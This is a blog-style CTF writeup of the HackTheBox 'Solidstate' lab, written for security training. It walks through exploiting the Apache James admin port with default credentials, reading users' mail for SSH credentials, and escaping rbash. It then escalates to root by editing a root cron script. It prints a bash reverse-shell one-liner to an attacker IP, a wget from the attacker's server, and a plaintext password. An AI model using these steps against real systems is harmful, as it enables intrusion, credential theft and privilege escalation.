---
title: "Solidstate"
date: 2024-07-28
draft: false
description: "HackTheBox Solidstate writeup"
tags: ["hackthebox", "htb", "linux", "medium"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Solidstate

## Overview

- **OS:** Linux
- **IP:** 10.10.10.51
- **Difficulty:** Medium
- **Platform:** HackTheBox
- **OSCP:** No
- **Lists:** N/A

### Summary

accessed james server , got ssh login details , logged in as mindy on ssh, escaped rbash shell by using a james server exploit which gave us a bash shell , enumerated using linpeas , further enumerated with linEnum , checked processes with pspy found a cron job running a root file nd used that to get a rev shell.

## Enumeration

nmap scan results

{{< figure src="image 1213.png" >}}

dirbuster result

## [http://10.10.10.51:80](http://10.10.10.51/)

Directories found during testing:

Dirs found with a 200 response:

/
/images/
/assets/
/assets/css/
/assets/fonts/
/assets/js/
/assets/sass/
/assets/css/images/
/assets/sass/base/
/assets/js/ie/
/assets/sass/components/
/assets/sass/layout/
/assets/sass/libs/

Dirs found with a 403 response:

/icons/
/icons/small/
/server-status/

Files found during testing:

Files found with a 200 responce:

/index.html
/services.html
/about.html
/assets/js/skel.min.js
/assets/js/jquery.min.js
/assets/js/jquery.scrollex.min.js
/assets/js/util.js
/assets/fonts/FontAwesome.otf
/assets/css/font-awesome.min.css
/assets/js/main.js
/assets/css/images/close.svg
/assets/css/ie8.css
/assets/fonts/fontawesome-webfont.eot
/assets/css/ie9.css
/assets/sass/base/_page.scss
/assets/js/ie/PIE.htc
/assets/sass/ie8.scss
/assets/sass/base/_typography.scss
/assets/js/ie/backgroundsize.min.htc
/assets/css/main.css
/assets/sass/ie9.scss
/assets/sass/components/_box.scss
/assets/js/ie/html5shiv.js
/assets/fonts/fontawesome-webfont.svg
/assets/fonts/fontawesome-webfont.ttf
/assets/sass/components/_button.scss
/assets/js/ie/respond.min.js
/assets/sass/components/_features.scss
/assets/fonts/fontawesome-webfont.woff
/assets/sass/components/_form.scss
/assets/sass/main.scss
/assets/sass/components/_icon.scss
/assets/fonts/fontawesome-webfont.woff2
/assets/sass/components/_image.scss
/assets/sass/components/_list.scss
/assets/sass/components/_section.scss
/assets/sass/components/_table.scss
/assets/sass/libs/_functions.scss
/assets/sass/layout/_banner.scss
/assets/sass/libs/_mixins.scss
/assets/sass/layout/_footer.scss
/assets/sass/libs/_skel.scss
/assets/sass/libs/_vars.scss
/assets/sass/layout/_header.scss
/assets/sass/layout/_menu.scss
/assets/sass/layout/_wrapper.scss

nothing interesting here

## Vulnerabilities

{{< figure src="image 1214.png" >}}

## Exploitation


James Mail Server is listening on four ports with different functions. Simple Mail Transfer Protocol (SMTP) on TCP 25, Post Office Protocol (POP3) on TCP 110, and Network News Transfer Protocol (NNTP) on TCP 119 are all services that this box is offering. I could look at potentially brute forcing valid user names or sending phishing emails, but first I want to look at port 4555.

TCP port 4555 is interesting because it is the James administration port. Even without an exploit, if I can access this service, I can likely get into things that might be useful.  - 0xdf

so lets visit port 4555 first

we are able to access using default root root creds

{{< figure src="image 1215.png" >}}

{{< figure src="image 1216.png" >}}

so we have these users , lets change the pass for them and then access nd check out their mails

{{< figure src="image 1217.png" >}}

james content

{{< figure src="image 1218.png" >}}

thomas has nothing

john content

{{< figure src="image 1219.png" >}}

{{< figure src="image 1220.png" >}}

ok so mindy seems to have some temporary pass nd her access is restricted.

lets check mindys mail

ok so mindy has 2 mails

{{< figure src="image 1221.png" >}}

lets check them out

{{< figure src="image 1222.png" >}}

{{< figure src="image 1223.png" >}}

ok so we have our ssh creds now which is mindy:P@55W0rd1!2@

mailadmin does not have any which is ironic

{{< figure src="image 1224.png" >}}

right off we have our user flag

{{< figure src="image 1225.png" >}}

{{< figure src="image 1226.png" >}}

ok so apparently our bash is restricted to a rbash, so we have very limited commands

lets try getting out of here first

running cat/etc/passwd also shows us what shell mindy has access to 

{{< figure src="image 1227.png" >}}

we can use the -t switch nd specify bash and it would log us in with the bash shell instead  of the intended rbash. 

sshpass -p 'P@55W0rd1!2@' ssh [mindy@10.10.10.51](mailto:mindy@10.10.10.51) -t bash

but i dont think this is the intended way of getting a bash shell in this box. 

lets try using a exploit instead

{{< figure src="image 1228.png" >}}

we will use the 4th option

lets use this payload

```
    bash -i >& /dev/tcp/10.10.14.35/8080 0>&1
```

{{< figure src="image 1229.png" >}}

{{< figure src="image 1230.png" >}}

{{< figure src="image 1231.png" >}}

annnd we have our shell 

{{< figure src="image 1232.png" >}}

lets try accessing admin w this now

{{< figure src="image 1233.png" >}}

we will still have to do some privesc , lets get linpeas on this and start enuming for some vectors

we set up the server in the dir containing [linpeas.sh](http://linpeas.sh) with

python3 -m http.server

and then we use this command on the victims machine to grab it

wget [http://10.10.14.35:8000/linpeas.sh](http://10.10.14.35:8000/linpeas.sh) 

{{< figure src="image 1234.png" >}}

now lets run it ( run it immediately , i noticed that files put in the tmp dir. are being removed periodically )

{{< figure src="image 1235.png" >}}

ok so there seems to be a corn job running under root , im not getting info on what is being run actually 

{{< figure src="image 1236.png" >}}

lets run a more thorough scan with linenum

[https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)

{{< figure src="image 1237.png" >}}

{{< figure src="image 1238.png" >}}

this file is pretty interesting , it has root permissions but is writeable to the user

{{< figure src="image 1239.png" >}}

lets check out the processes as well with pspy

[https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

The Linux version `4.9.0-3-686-pae` indicates that this is a 32-bit kernel. The "686" refers to the 32-bit architecture, and "PAE" (Physical Address Extension) allows the system to address more than 4 GB of RAM on a 32-bit system. So, this is a 32-bit version of Debian.

so lets use the 32 bit version of pspy

{{< figure src="image 1240.png" >}}

{{< figure src="image 1241.png" >}}

ok so this process seems to be running every 3mins and we know its being run with root privs. 

lets check this file out

{{< figure src="image 1242.png" >}}

ok so this was the file responsible for cleaning up tmp every 3 mins , lets change it so that we get a rev shell instead.

lets upgrade our shell a bit first

{{< figure src="image 1243.png" >}}

now lets edit the [tmp.py](http://tmp.py) file

{{< figure src="d715efe9-4d8e-46fa-9d99-e8b2c86981a0.png" >}}

and in 3 minutes we should have our shell

{{< figure src="image 1244.png" >}}

grabbing root flag

{{< figure src="image 1245.png" >}}
